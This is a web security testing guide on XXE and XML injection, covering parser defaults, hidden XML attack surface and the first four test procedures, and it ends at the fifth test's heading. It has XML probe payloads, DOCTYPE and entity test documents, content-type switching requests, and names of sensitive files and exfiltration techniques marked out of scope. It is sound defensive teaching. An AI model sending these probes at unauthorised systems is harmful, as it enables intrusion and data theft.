---
title: "XXE and XML Injection"
date: 2026-11-15 20:08:00 +0000
subcategory: injection
summary: "Testing XML parsers and XML builders: hidden XML surface, in-band and OOB XXE, XInclude, XSLT, structural XML injection and per-parser hardening."
refs: [WSTG-INJT-07, v5.0.0-1.5.1, v5.0.0-1.2.1, v5.0.0-1.3.4, v5.0.0-1.3.5, v5.0.0-5.2.2, "API8:2023", "A02:2025", "A05:2025", CWE-611, CWE-776, CWE-91, CWE-827]
tags: [web, injection, xxe, xml, soap, file-upload]
---

This note is part of our [Web Application Security testing guide](/web/web-application-security-testing-guide/) and sits under [Injection](/web/web-injection-testing-guide/). It covers two related weaknesses that WSTG files together as XML Injection (`WSTG-INJT-07`). The first is **XML External Entity injection (XXE)**: an XML parser that honours a document type definition (DTD) supplied by the attacker and fetches files or URLs on the server's behalf (CWE-611), or expands entities until it runs out of memory (CWE-776). The second is **structural XML injection**: the application builds XML by string concatenation, so user input closes a tag or an attribute and changes the document another system receives (CWE-91). You get the model (what a parser does with a DOCTYPE, where parsers hide in a web stack, and how defaults differ between libxml2, Java, .NET, PHP, Python and Node.js), the attack surface people miss (content-type switching, SVG and Office uploads, feeds and sitemaps, XInclude in fragments, XSLT, PDF pipelines), twelve tests that stop at the least invasive proof, and the parser settings that close the hole in each ecosystem. Request forgery as an end in itself belongs to the Server-Side Request & Files subcategory (not yet published); SAML signature handling belongs to Authentication (not yet published). Sibling Injection notes cover [SQL injection](/web/web-sql-injection/), [server-side template injection](/web/web-server-side-template-injection/) and [LDAP and XPath injection](/web/web-ldap-xpath-injection/), which often sits next to XML processing.

## Contents

- [How it works](#how-it-works)
  - [Entities, DTDs and why a parser fetches things](#entities-dtds-and-why-a-parser-fetches-things)
  - [Where XML parsers live in a web application](#where-xml-parsers-live-in-a-web-application)
  - [Parser defaults by platform](#parser-defaults-by-platform)
  - [XInclude and XSLT are separate switches](#xinclude-and-xslt-are-separate-switches)
- [What goes wrong](#what-goes-wrong)
  - [XML endpoints you can see](#xml-endpoints-you-can-see)
  - [Content-type switching on JSON and form endpoints](#content-type-switching-on-json-and-form-endpoints)
  - [Uploaded files that are XML inside](#uploaded-files-that-are-xml-inside)
  - [Feeds, sitemaps and imports the server fetches](#feeds-sitemaps-and-imports-the-server-fetches)
  - [SOAP, SAML and other enveloped XML](#soap-saml-and-other-enveloped-xml)
  - [Fragments embedded in server-built XML](#fragments-embedded-in-server-built-xml)
  - [XSLT and user-supplied stylesheets](#xslt-and-user-supplied-stylesheets)
  - [PDF and document generators](#pdf-and-document-generators)
  - [Structural XML injection](#structural-xml-injection)
  - [Entity expansion and resource exhaustion](#entity-expansion-and-resource-exhaustion)
  - [What an attacker gets](#what-an-attacker-gets)
- [Testing](#testing)
  - [Before you start](#before-you-start)
  - [GT-WEB-XXE-1: Inventory every XML-consuming code path](#gt-web-xxe-1-inventory-every-xml-consuming-code-path)
  - [GT-WEB-XXE-2: Content-type switching on JSON and form endpoints](#gt-web-xxe-2-content-type-switching-on-json-and-form-endpoints)
  - [GT-WEB-XXE-3: Probe XML structure with metacharacters](#gt-web-xxe-3-probe-xml-structure-with-metacharacters)
  - [GT-WEB-XXE-4: DTD acceptance and internal entity expansion](#gt-web-xxe-4-dtd-acceptance-and-internal-entity-expansion)
  - [GT-WEB-XXE-5: External entity resolution to your collaborator](#gt-web-xxe-5-external-entity-resolution-to-your-collaborator)
  - [GT-WEB-XXE-6: Blind detection with parameter entities](#gt-web-xxe-6-blind-detection-with-parameter-entities)
  - [GT-WEB-XXE-7: Agreed-file read and error-based disclosure](#gt-web-xxe-7-agreed-file-read-and-error-based-disclosure)
  - [GT-WEB-XXE-8: XInclude when you control only a fragment](#gt-web-xxe-8-xinclude-when-you-control-only-a-fragment)
  - [GT-WEB-XXE-9: XML inside uploads and imports](#gt-web-xxe-9-xml-inside-uploads-and-imports)
  - [GT-WEB-XXE-10: XML injection into server-built documents](#gt-web-xxe-10-xml-injection-into-server-built-documents)
  - [GT-WEB-XXE-11: XSLT processing and user-controlled stylesheets](#gt-web-xxe-11-xslt-processing-and-user-controlled-stylesheets)
  - [GT-WEB-XXE-12: Parser configuration review and expansion limits](#gt-web-xxe-12-parser-configuration-review-and-expansion-limits)
- [Secure implementation](#secure-implementation)
  - [Design rules](#design-rules)
  - [Java and Spring](#java-and-spring)
  - [.NET](#net)
  - [PHP and Laravel](#php-and-laravel)
  - [Python and Django](#python-and-django)
  - [Node.js](#nodejs)
  - [libxml2 and other native parsers](#libxml2-and-other-native-parsers)
  - [SVG and Office uploads](#svg-and-office-uploads)
  - [Building XML without string concatenation](#building-xml-without-string-concatenation)
  - [Static analysis](#static-analysis)
  - [Regression tests](#regression-tests)
- [Practice labs](#practice-labs)
- [Real-world cases](#real-world-cases)
- [Rating findings](#rating-findings)
- [Mapping](#mapping)
- [References](#references)

## How it works

### Entities, DTDs and why a parser fetches things

An XML document may start with a `DOCTYPE` declaration. Inside it, a DTD can declare **entities**: named pieces of text that the parser substitutes wherever `&name;` appears. Three kinds matter for testing:

| Kind | Declared as | Referenced as | What the parser does |
|---|---|---|---|
| Internal general entity | `<!ENTITY name "text">` | `&name;` in the document body | Replaces the reference with the literal text |
| External general entity | `<!ENTITY name SYSTEM "uri">` | `&name;` in the document body | Opens the URI (`file:`, `http:`, sometimes `ftp:`, `jar:`, `php:` and others) and inserts what it reads |
| Parameter entity (internal or external) | `<!ENTITY % name SYSTEM "uri">` | `%name;`, only inside the DTD | Fetches or expands DTD text, so it can load a second DTD from somewhere else |

The DTD can also be external: `<!DOCTYPE root SYSTEM "http://…/x.dtd">` tells the parser to fetch a whole DTD file. Nothing in the XML specification says a parser must refuse these; the decision belongs to the parser configuration. That is the whole vulnerability: when untrusted XML reaches a parser that **loads external DTDs or resolves external entities**, the document author decides which files and URLs the server opens.

Three consequences follow from that model:

- **File disclosure.** An external entity that points at a local file puts the file's text into the parsed document. If the application reflects any element of that document back (a "name" field in a response, an error message quoting a value), the attacker reads the file.
- **Server-side request forgery.** An entity that points at `http://` makes the server send a `GET` request from inside its network. Even with no reflection, the request itself proves resolution and can reach hosts the attacker cannot.
- **Resource exhaustion.** Entities can reference other entities. A few nested definitions expand to gigabytes (the "billion laughs" pattern), and an entity pointing at a device that never ends can tie up a worker. This needs no external access at all, which is why "external entities off" is not the same as "DTDs off".

**Structural XML injection** is a different bug in the opposite direction. The application does not parse attacker XML; it *writes* XML, by concatenating user input into a template, and sends it to another component (a SOAP service, a payment gateway, a configuration file, a message queue). If `<`, `>`, `&`, `"` or `'` are not encoded for their position, input can close the current element and add new ones, and the receiving system trusts the result because it came from the application.

### Where XML parsers live in a web application

Most modern front ends speak JSON, so testers stop looking for XML too early. Parsers live in places the browser never shows you:

| Layer | Typical parser use |
|---|---|
| Web framework request binding | Spring MVC message converters, ASP.NET model binding, JAX-RS / JAX-WS providers, PHP `simplexml_load_string` in a controller, Express middleware that parses `text/xml` |
| Legacy and partner interfaces | SOAP endpoints (`/ws`, `/services`, `*.asmx`, `*.svc`), B2B order interfaces, XML-RPC, EDI gateways |
| Authentication | SAML responses and metadata, WS-Federation, some OpenID legacy flows |
| File processing | SVG rasterising and thumbnailing, DOCX/XLSX/PPTX/ODT preview and text extraction, XLIFF translation import, GPX/KML map import, XMP metadata in images and audio |
| Server-side fetching | RSS/Atom feed readers, sitemap crawlers, oEmbed/discovery documents, webhook consumers that accept XML |
| Document generation | XSLT report templates, XSL-FO to PDF, XHTML-to-PDF renderers, invoice and e-invoicing formats (UBL and similar) |
| Configuration and plugins | Uploaded theme or plugin descriptors, import/export of settings as XML |

Each of these usually creates its **own** parser instance, often inside a third-party library, with its own defaults. Hardening the main API parser does nothing for the thumbnailer.

### Parser defaults by platform

Defaults have moved a long way in the last decade, which is why XXE is now rarer on the main request path and still common on the side paths. The summary below reflects the documentation at the time of writing; always confirm the exact library and version in use.

| Platform / library | Default with untrusted XML | What re-opens the hole |
|---|---|---|
| **libxml2 ≥ 2.9** (C; underlies PHP, lxml, libxmljs, Nokogiri, many native tools) | Entity substitution and external DTD loading are off unless the caller asks | Options `XML_PARSE_NOENT` (substitute entities) and `XML_PARSE_DTDLOAD` (load the external subset); libxml2 2.13 added `XML_PARSE_NO_XXE` to keep external entities blocked even when substitution is on |
| **Java JAXP** (JDK built-in `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`) | Oracle's JAXP Security Guide states that the default behaviour is to connect and fetch external resources; secure processing is on but does not restrict external entity resolution | Nothing: you must harden each factory explicitly (see [Java and Spring](#java-and-spring)). Wrappers such as dom4j, JDOM and Commons Digester inherit whatever parser they are given |
| **.NET Framework ≥ 4.5.2** and modern .NET | `XmlReader` prohibits DTDs by default; `XmlDocument`, `XmlTextReader` and `XPathNavigator` have a `null` resolver by default from 4.5.2 | Setting `DtdProcessing.Parse` together with a non-null `XmlUrlResolver`; ASP.NET apps whose `<httpRuntime targetFramework>` is missing or below 4.5.2 keep the old unsafe behaviour regardless of the installed runtime |
| **PHP 8+** (`DOMDocument`, `SimpleXML`, `XMLReader`) | PHP 8 requires libxml2 ≥ 2.9.0, so external entities are not loaded by default; `libxml_disable_entity_loader()` is deprecated for that reason | Passing `LIBXML_NOENT`, `LIBXML_DTDLOAD` or `LIBXML_DTDVALID`. `LIBXML_NOENT` means "substitute entities", which is the opposite of what its name suggests to many developers |
| **Python standard library** (`xml.etree.ElementTree`, `minidom`, `xml.sax`, `pulldom`) | Expat does not read files or open network connections by default; `xml.sax` stopped processing external general entities by default in Python 3.7.1 | Enabling `feature_external_ges` / `feature_external_pes` on a SAX parser. Entity-expansion denial of service depends on the Expat version (the Python docs name Expat below 2.7.2 as affected) |
| **lxml** (Python, libxml2) | Since lxml 5.0, `resolve_entities` defaults to `'internal'` (internal entities only) and `no_network` is on | `resolve_entities=True`, `load_dtd=True` with `no_network=False`, or old lxml. The lxml changelog records two later fixes: 6.1.0 for `iterparse()` and `ETCompatXMLParser`, which still resolved external entities by default (CVE-2026-41066), and 6.1.3 for external parameter entities being parsed under the `'internal'` setting |
| **Node.js** | No XML parser in core. `libxmljs` follows libxml2 and does not substitute entities unless asked; `xml2js`/`sax` and `fast-xml-parser` are pure JavaScript and do not fetch external entities | `libxmljs` option `noent: true` (deprecated alias of `replaceEntities: true` in libxmljs 1.x), or a native binding with network access enabled |

Two practical lessons come from this table. First, **Java is still the platform where an unhardened parser is the default**, so Java back ends, Java document libraries (Apache POI, Tika, FOP, Batik) and Java SOAP stacks deserve the most attention. Second, on libxml2-based stacks the bug almost always comes from **a flag someone added** (`LIBXML_NOENT`, `resolve_entities=True`, `noent: true`), typically to make named entities in legitimate documents expand. That makes code search very effective.

### XInclude and XSLT are separate switches

**XInclude** is a W3C specification that lets an element `<xi:include href="…"/>` pull another resource into the document. It needs no DOCTYPE, so it works when you only control a **value** inside a document the server builds, and it is controlled by a separate parser option (`setXIncludeAware` in Java, `XML_PARSE_XINCLUDE` or an explicit `xinclude()` call on libxml2/lxml, `LIBXML_XINCLUDE` for PHP `XMLReader`). Turning DTDs off does not turn XInclude off, and the reverse.

**XSLT** is a programming language for transforming XML. A stylesheet can read other documents (`document()`, `xsl:include`, `xsl:import`, and in XSLT 2.0+ `unparsed-text()`), and several processors offer **extension functions** that call into the host language (Xalan-J and Saxon Java extensions, `XSLTProcessor::registerPHPFunctions()` in PHP, `XsltSettings.EnableScript` in .NET). If users can supply or influence a stylesheet, they are writing code that the server runs. Entity hardening on the input parser does not cover any of this; the transformer needs its own restrictions.

## What goes wrong

### XML endpoints you can see

The obvious case: a request body with `Content-Type: application/xml` or `text/xml`, a SOAP envelope, an XML-RPC call. These are where XXE was found for years, and on Java back ends they still produce findings. Look for `.asmx`, `.svc`, `?wsdl`, `/services/`, `/soap`, `/xmlrpc.php`, `/api/*/xml`, and for "deprecated" or "B2B" interfaces mentioned in JavaScript bundles or API documentation. Old interfaces kept alive for one partner are often on an older framework version than the main application.

### Content-type switching on JSON and form endpoints

Many frameworks choose a body parser from the `Content-Type` header, not from the route. Spring Boot registers an XML message converter as soon as `jackson-dataformat-xml` (or JAXB) is on the classpath, so a controller written for JSON may also accept `application/xml`. JAX-RS resources annotated with both media types, ASP.NET Web API with the XML formatter still registered, and PHP code that sniffs the body behave the same way. The developer never thought about XML for that endpoint, so the parser was never hardened. Why it matters: it turns every JSON endpoint into a potential XML endpoint. Where to look: any `POST`/`PUT` that takes a body, especially when error messages mention JAXB, Jackson XML, `XmlSerializer` or `DataContractSerializer`.

### Uploaded files that are XML inside

**SVG** is XML. An image pipeline that rasterises or inspects SVG (ImageMagick delegates, librsvg, Apache Batik, browser-based renderers on the server) parses it, sometimes even when the upload form says "PNG or JPEG", because the library detects the format from content. **Office Open XML** files (DOCX, XLSX, PPTX) and **OpenDocument** files are ZIP archives of XML parts: `[Content_Types].xml`, `word/document.xml`, `xl/workbook.xml`, `xl/sharedStrings.xml` and so on. Previews, virus-scanning helpers, text extraction for search, spreadsheet import and format conversion all parse those parts, usually through a document library with its own parser. XMP metadata inside JPEG, PDF and audio files is XML too; the WordPress case in [Real-world cases](#real-world-cases) came from metadata in a `.wav` file. Why it matters: these pipelines run on workers that are rarely reviewed and often have broad file system and network access.

### Feeds, sitemaps and imports the server fetches

When the application fetches XML from a URL **you** supply (an RSS/Atom feed reader, "import from URL", a sitemap crawler, a podcast directory, oEmbed or OPML import), you control the whole document, DOCTYPE included, and the request arrives from a server that may sit on an internal network. This is the shape of the Elastic case in [Real-world cases](#real-world-cases): the crawler fetched `robots.txt`, followed the `sitemap` directive and parsed the sitemap with an unhardened parser. Where to look: any feature that takes a URL and shows you something derived from XML content.

### SOAP, SAML and other enveloped XML

SOAP services parse an envelope that often goes through several handlers (WS-Security, logging, routing), each with a parser. SAML responses and IdP/SP metadata are XML, parsed before the signature is checked; XXE in SAML processing is a known class, but testing SAML (signature wrapping, assertion handling) belongs to the Authentication subcategory, not yet published. In this note you only check whether the SAML consumer's **parser** accepts a DOCTYPE, and only when SAML is in scope and you control the IdP side (a test IdP you run, or a lab).

### Fragments embedded in server-built XML

Often you control one field (a product ID, a quantity, a search term) that the back end pastes into a larger XML document and sends to another service. You cannot add a DOCTYPE, because it would land in the middle of the document. Two things are still possible: **XInclude**, if the receiving parser has it enabled, and **structural injection** (below), if the field is not encoded. A tell-tale sign is an XML parser error coming back for a field that looks like plain text.

### XSLT and user-supplied stylesheets

Reporting and export features sometimes let users upload or edit an XSLT template ("customise your invoice layout"), or select a stylesheet by name or URL. A stylesheet is code: it can read other documents with `document()`, list processor details with `system-property()`, and with extension functions enabled it can call host-language methods, which typically means code execution. Even without extensions, an XSLT 1.0 processor that resolves `document('file:///…')` is a file-read primitive. ASVS `v5.0.0-1.3.5` (L2) covers this: user-supplied XSL must be sanitised or disabled.

### PDF and document generators

Many "generate PDF" features are XML pipelines: XSL-FO rendered by Apache FOP, XHTML rendered by an XML-strict engine, or DOCX templates filled in and converted. If user input lands in the XML source **before** parsing, the same entity and XInclude questions apply. HTML-to-PDF converters built on browser engines are a different problem (HTML injection leading to server-side requests and local file access); that is covered in the Server-Side Request & Files subcategory, not yet published.

### Structural XML injection

When the application concatenates input into XML, the effect depends on the receiver:

- **Element injection:** closing the current element and adding a sibling, such as a second `<userid>` or `<price>` element. Many binders take the last occurrence of a duplicated element, some the first; either way the receiver sees a value the application never meant to send.
- **Attribute injection:** a quote closes `attr="…"`, and the attacker adds `role="admin"` or overrides a later attribute.
- **Comment and CDATA tricks:** `<!--` in one field and `-->` in a later field comments out the server-generated elements between them, which can defeat a DTD or schema that enforces one occurrence per element. WSTG-INJT-07 walks through this pattern.
- **SOAP message manipulation:** injecting extra elements into a SOAP body changes the operation's parameters (amount, account, quantity), or with some stacks adds a second operation. Where WS-Security signatures are applied *after* the application builds the message, the injected content is signed as if it were legitimate.
- **Downstream XPath or XSLT:** the injected document is later queried with XPath or transformed, and the injection shifts which nodes match. XPath injection itself is covered in [LDAP and XPath injection](/web/web-ldap-xpath-injection/).

Why it matters: the receiving service trusts the application, so this is often a business-logic or privilege bug in disguise (order price, user ID, role). Where to look: features that talk to a payment provider, a mainframe or ERP connector, a SOAP partner, or generate XML exports and configuration.

### Entity expansion and resource exhaustion

Even with external entities blocked, a parser that expands **internal** entities without limits can be pushed to exponential (nested entities) or quadratic (one large entity repeated) memory and CPU use (CWE-776). Modern libxml2, .NET from 4.5.2, Java with secure processing and recent Expat all apply limits, but limits can be raised (`huge_tree=True` in lxml, `LIBXML_PARSEHUGE` in PHP, `XML_PARSE_HUGE` in libxml2, custom `jdk.xml.*Limit` values in Java). Decompression adds a second multiplier for DOCX/XLSX and gzip-encoded bodies (ASVS `v5.0.0-5.2.3`). You confirm this weakness by **reading configuration**, never by sending an expansion payload to a shared environment; see [Before you start](#before-you-start).

### What an attacker gets

You prove resolution; you do not demonstrate the end state. In prose, so the report explains impact: an XXE that resolves external entities typically lets an attacker read files the parsing process can read (configuration with database passwords, keys, source), make the server send requests to internal hosts and services, sometimes reach cloud instance metadata (where IMDSv1-style unauthenticated `GET` access is still enabled; header-protected metadata services generally cannot be reached through an entity URI, as WSTG notes), on Windows trigger outbound authentication to an attacker-controlled share, and on PHP use stream wrappers that open further options. Out-of-band techniques can carry file content out even when nothing is reflected. PortSwigger's [blind XXE](https://portswigger.net/web-security/xxe/blind) page and WSTG-INJT-07 describe these chains in detail. None of them is part of the tests below.

## Testing

Every test below assumes an authorised engagement with written scope and rules of engagement, a bug bounty programme whose rules allow this testing, or a deliberately vulnerable lab. Requests, responses and hosts are illustrative; real applications differ in detail. Each test ends at the least invasive proof that untrusted XML reaches a parser or builder in an unsafe way.

### Before you start

**Scope.** Confirm in writing which hosts, endpoints and **processing back ends** are in scope. XML is often parsed by a worker, a document-conversion service or a third-party SaaS connector behind the application; an out-of-band callback from an IP you do not recognise may come from a system the client does not own. Agree with the client:

- whether out-of-band (OOB) callbacks from their servers to your collaborator are allowed (some environments alert on them, which is good to know in advance);
- one **harmless proof file** for a file-read proof. On Linux, `/etc/hostname` is the usual choice. Better still, ask the client to place a canary file (for example `/tmp/gt-xxe-canary.txt` containing a random string) on the test system. For Windows hosts, agree an equivalent harmless file by name; do not pick one yourself;
- whether SOAP, SAML and file-processing paths are in scope, and which test accounts and upload areas you may use.

**Proxy.** One Burp project per engagement with the target scope set and Logger on. Install **Content Type Converter** (BApp Store) to turn captured JSON or form requests into XML for [GT-WEB-XXE-2](#gt-web-xxe-2-content-type-switching-on-json-and-form-endpoints). Burp Scanner's XXE checks are useful leads on test systems; in production, run active scanning only where the rules allow it and only on endpoints you have mapped.

**Collaborator.** Use **Burp Collaborator** or a self-hosted **interactsh** server you control. Generate a fresh, unique subdomain per test and per parameter, and record which payload used which subdomain, so that a callback tells you exactly which code path resolved the entity. This note writes the collaborator as `gt-xxe-NN.collab.example.org`; replace it with your own. Never point payloads at a third party's server, and never at internal addresses of the target.

**Safe proofs.** In order of preference:

1. A **behaviour difference** with no external access: the document is accepted with a DOCTYPE, an internal entity expands to a marker string you chose.
2. An **OOB DNS or HTTP interaction** with your own collaborator.
3. Reading **one agreed harmless file** (`/etc/hostname` or the client's canary file), once.

Reading application or system secrets (`/etc/passwd`, `/etc/shadow`, configuration files, keys, environment files, `wp-config.php`), probing internal hosts or ports, requesting cloud metadata endpoints, UNC paths to your own SMB listener, exfiltration through external DTDs, and the local-DTD repurposing technique are **out of scope** unless the client approves that specific step in writing. Describe the potential in the report instead.

**Entity expansion is denial of service.** "Billion laughs", quadratic blowup, very large inputs, recursive entities and entities pointing at `/dev/random`, `/dev/zero` or other endless sources (WSTG's own example uses `/dev/random`) are **DoS tests**. Do not run them against production or any shared environment, and do not run them on a staging system without an explicit, scheduled agreement. Instead, check the parser configuration and version ([GT-WEB-XXE-12](#gt-web-xxe-12-parser-configuration-review-and-expansion-limits)) and report missing limits from evidence.

**Rate limits.** XML tests need few requests. Send them one at a time from Repeater, at a pace the rules allow (a request every few seconds is plenty), and avoid Intruder-style payload lists against parsers: each malformed document can produce a stack trace in the client's logs and may page someone. Upload tests create stored objects; clean them up or tell the client which ones to remove.

**Stop rules.**

- If a response contains data that is not yours (another user's record, credentials, keys, file content you did not agree to read), stop, keep only the minimum redacted evidence (the request, the status, a masked excerpt), do not request more, and report it to the client or programme immediately.
- If the target slows down, errors spread, or a worker queue backs up after a test, stop and tell the client.
- If an OOB callback arrives from an unexpected source (a different organisation's IP range, a security vendor's sandbox), stop and check scope before going further.

### GT-WEB-XXE-1: Inventory every XML-consuming code path

*Guler Tech methodology.* Implements the discovery step of WSTG-INJT-07, using WSTG-INFO-06 (entry points) and WSTG-APIT-01 (API reconnaissance).

#### What it checks

Where XML enters the application, which parser or library is likely to handle it, and which paths are reachable for you. The output is the work list for every other test in this note.

#### Prerequisites

A full walk-through of the application in Burp Logger; any API documentation (WSDL, OpenAPI, Postman collection); the JavaScript bundles; a list of upload and import features.

#### Steps

1. Filter Logger for request bodies or responses with `Content-Type` containing `xml`, bodies starting with `<`, and `SOAPAction` headers.
2. Search JavaScript bundles and documentation for `wsdl`, `soap`, `xml`, `.asmx`, `.svc`, `xmlrpc`, `application/xml`, `text/xml`, `DOMParser` used on server responses, and names of B2B or partner endpoints.
3. Request `?wsdl` or `?singleWsdl` on any `.asmx`, `.svc` or `/services/` path you found. A WSDL lists every operation and the XML schema of each message.
4. List features that accept files or URLs: avatars and images (does it accept SVG?), document upload and preview, spreadsheet import, translation import (XLIFF), map import (GPX, KML), "import from URL", RSS/Atom subscriptions, sitemaps, webhooks.
5. List features that **generate** XML or PDF: exports, invoices, reports with custom templates, integrations that call a SOAP partner.
6. Fingerprint the stack from headers, error pages and cookie names (Java `JSESSIONID`, ASP.NET `ASP.NET_SessionId`, PHP `PHPSESSID`) to predict the parser defaults from [Parser defaults by platform](#parser-defaults-by-platform).

```bash
# Look for XML in a saved Burp Logger export or proxy history dump (illustrative)
grep -iE 'content-type: *(application|text)/[a-z+.-]*xml|soapaction|<\?xml' burp-history.txt | sort | uniq -c | sort -rn | head
curl -s 'https://api.example.com/services/OrderService.svc?singleWsdl' | head -40
```

#### Observation

A table like this (illustrative):

| Entry point | Format | Likely parser | Reflection? | Notes |
|---|---|---|---|---|
| `POST /api/orders` | JSON (does it accept XML?) | Spring MVC, Jackson | yes, echo of `note` | candidate for GT-WEB-XXE-2 |
| `POST /services/OrderService.svc` | SOAP 1.1 | WCF | SOAP faults | "legacy B2B" |
| `POST /api/profile/avatar` | multipart image | unknown, accepts `.svg` | thumbnail rendered | GT-WEB-XXE-9 |
| `POST /api/import/products` | XLSX | Java worker (Apache POI?) | import summary | GT-WEB-XXE-9 |
| `POST /api/feeds` | URL to RSS/Atom | worker | titles shown | GT-WEB-XXE-9 |
| `GET /api/stock?productId=` | query → back-end XML | unknown | stock value | GT-WEB-XXE-8, -10 |

#### Evaluation

No finding by itself. Exposed WSDLs and verbose SOAP faults on internet-facing services are worth an informational note when they reveal internal operations or stack details.

#### False positives

XML returned by the server is not an input. `DOMParser` in the browser parses XML on the client, not on the server (a client-side concern). `Content-Type: application/xml` on a request whose body the server ignores.

#### Automation

Burp's passive scanner and Logger filters cover most of this. For CI on the client side, keep an inventory of parser instantiations (see [Static analysis](#static-analysis)) and require each one to use the shared hardened factory.

### GT-WEB-XXE-2: Content-type switching on JSON and form endpoints

*Guler Tech methodology.* Implements WSTG-INJT-07 discovery for endpoints that were not designed for XML.

#### What it checks

Whether an endpoint that the client uses with JSON or form data also parses an XML body, which opens XXE and XML-specific behaviour on a path the developers never hardened.

#### Prerequisites

Endpoints from GT-WEB-XXE-1 that accept a body; your own test account; Content Type Converter or a hand-built equivalent.

#### Steps

1. Capture a normal JSON request:

```http
POST /api/orders/notes HTTP/1.1
Host: api.example.com
Authorization: Bearer <TOKEN_USER_A>
Content-Type: application/json

{"orderId":1001,"note":"GT-A-canary-01"}
```

2. Send it with the same data as XML. Try the root element names a binder would expect (the class name, `root`, or the JSON object name if you know it):

```http
POST /api/orders/notes HTTP/1.1
Host: api.example.com
Authorization: Bearer <TOKEN_USER_A>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<OrderNote><orderId>1001</orderId><note>GT-A-canary-02</note></OrderNote>
```

3. Repeat with `Content-Type: text/xml`, and with `Accept: application/xml` to see whether the response can also be XML (a sign that an XML converter is registered).
4. Do the same for form endpoints (`application/x-www-form-urlencoded`), which some frameworks also bind from XML.
5. If an XML body is accepted, carry the endpoint into GT-WEB-XXE-4 to GT-WEB-XXE-7.

```bash
curl -s -i -X POST 'https://api.example.com/api/orders/notes' \
  -H 'Authorization: Bearer <TOKEN_USER_A>' -H 'Content-Type: application/xml' \
  --data '<OrderNote><orderId>1001</orderId><note>GT-A-canary-02</note></OrderNote>'
```

#### Observation

Accepted (illustrative): the note `GT-A-canary-02` appears on order 1001, or the response is the same success as for JSON. Also interesting: an XML parser error (`Unexpected character`, `JAXBException`, `SAXParseException`, `XmlException`), which proves the body reached an XML parser even if binding failed.

Not accepted: `415 Unsupported Media Type`, or a JSON parse error, for every XML variant.

#### Evaluation

- **Fail (lead, not yet a finding):** the endpoint parses XML. It becomes a finding only when a later test shows unsafe parser behaviour; on its own, accepting XML is an attack-surface observation worth reporting as Info, because it means the parser configuration matters on that route.
- **Pass:** `415` or equivalent for all XML content types.

#### False positives

A generic error page that looks the same for any unsupported body. A WAF block on `<?xml` (record it, but it says nothing about the parser). A `200` that ignores the body entirely: check that the canary value actually landed.

#### Automation

Content Type Converter in Burp; Burp Scanner's checks. In the client's CI, add one API test per controller asserting that `application/xml` returns `415` unless the endpoint is meant to accept XML.

### GT-WEB-XXE-3: Probe XML structure with metacharacters

*Guler Tech methodology.* Implements the metacharacter discovery step of WSTG-INJT-07.

#### What it checks

Whether input you control ends up inside an XML document, either one you send or one the server builds from your values, and whether it is encoded for its position.

#### Prerequisites

Parameters from GT-WEB-XXE-1, including plain-looking fields that may be copied into server-built XML (IDs, quantities, names).

#### Steps

1. For each candidate parameter, send these one at a time and compare the response with a baseline request:

```text
GT'test
GT"test
GT<test
GT&test
GT]]>test
GT<!--test
```

2. Then send a value that is well-formed XML on its own and harmless, to see whether it is parsed rather than escaped:

```text
GT<b>canary</b>test
```

3. Look at where the value comes back: in the response body, in an error, in a later export, or in an email.

#### Observation

Suggestive (illustrative):

```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/plain

org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 52; The entity name must immediately follow the '&' in the entity reference.
```

Also suggestive: `GT<b>canary</b>test` comes back as `GTcanarytest` (the tag was parsed and the element's text kept), or the field is silently truncated at `<`.

Safe: the value is stored and returned exactly as sent, or returned encoded (`GT&lt;test`, `GT&amp;test`).

#### Evaluation

- **Fail:** a metacharacter produces an XML parser error, or embedded markup is interpreted. This shows unencoded input reaching an XML builder or parser and is the precondition for GT-WEB-XXE-8 and GT-WEB-XXE-10. On its own, report it as Low (input handling and error disclosure) unless a later test shows impact.
- **Pass:** consistent encoding or storage as literal text, with generic error messages.

#### False positives

Input validation that rejects `<` with a friendly message is not an XML problem. HTML encoding in the response tells you about output encoding, not about how the value was used server-side. JSON errors for unbalanced quotes in a JSON body are not XML errors.

#### Automation

Burp Scanner flags XML injection candidates. The wfuzz XML injection list linked from WSTG is fine on a lab, but on client systems keep to a handful of probes per parameter.

### GT-WEB-XXE-4: DTD acceptance and internal entity expansion

*Guler Tech methodology.* Implements the first, no-network step of the XXE section of WSTG-INJT-07.

#### What it checks

Whether the parser accepts a `DOCTYPE` at all and whether it expands an **internal** entity. Neither needs any external access, so this is the safest first signal on any XML input.

#### Prerequisites

An endpoint that parses XML you send (GT-WEB-XXE-1 or -2) and a field whose value is reflected or stored where you can see it.

#### Steps

1. Baseline: send the normal document with a canary value in a reflected field.
2. Add a DOCTYPE with no entities. Use the document's real root element name:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OrderNote>
<OrderNote><orderId>1001</orderId><note>GT-A-canary-03</note></OrderNote>
```

3. Declare one internal entity and reference it in the reflected field. Avoid names of the five predefined entities (`lt`, `gt`, `amp`, `quot`, `apos`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OrderNote [ <!ENTITY gtcanary "GT-entity-expanded-04"> ]>
<OrderNote><orderId>1001</orderId><note>&gtcanary;</note></OrderNote>
```

4. Check where the note is shown (response, order page, export).

#### Observation

| Result | Meaning |
|---|---|
| Error such as `DOCTYPE is disallowed when the feature "http://apache.org/xml/features/disallow-doctype-decl" set to true` or `For security reasons DTD is prohibited in this XML document` | DTDs are rejected: the recommended configuration |
| Document accepted, note shows `GT-entity-expanded-04` | DTDs are processed and internal entities expand. Continue with GT-WEB-XXE-5 |
| Document accepted, note shows `&gtcanary;` literally or is empty | DTD accepted but entities not substituted (seen on libxml2-based stacks without entity substitution, depending on how the application reads the value) |
| Document accepted, DOCTYPE silently dropped | DTD ignored (for example .NET `DtdProcessing.Ignore`) |

#### Evaluation

- **Pass:** DOCTYPE rejected or ignored.
- **Weakness, not yet XXE:** internal entities expand. This means DTD processing is on, which ASVS `v5.0.0-1.5.1` asks you to restrict, and it is the precondition for entity-expansion DoS. Report as Low, or Info if GT-WEB-XXE-5 to -7 and GT-WEB-XXE-12 show that external resolution and expansion limits are in place.
- An internal-entity expansion is **not** a file-read or SSRF finding by itself; do not rate it as XXE.

#### False positives

A field that stores the raw request body and shows it back unparsed. An application that strips the DOCTYPE in its own code before parsing (good, but confirm with GT-WEB-XXE-5).

#### Automation

A single unit or API test with this document belongs in the client's regression suite: assert the parser rejects it (see [Regression tests](#regression-tests)).

### GT-WEB-XXE-5: External entity resolution to your collaborator

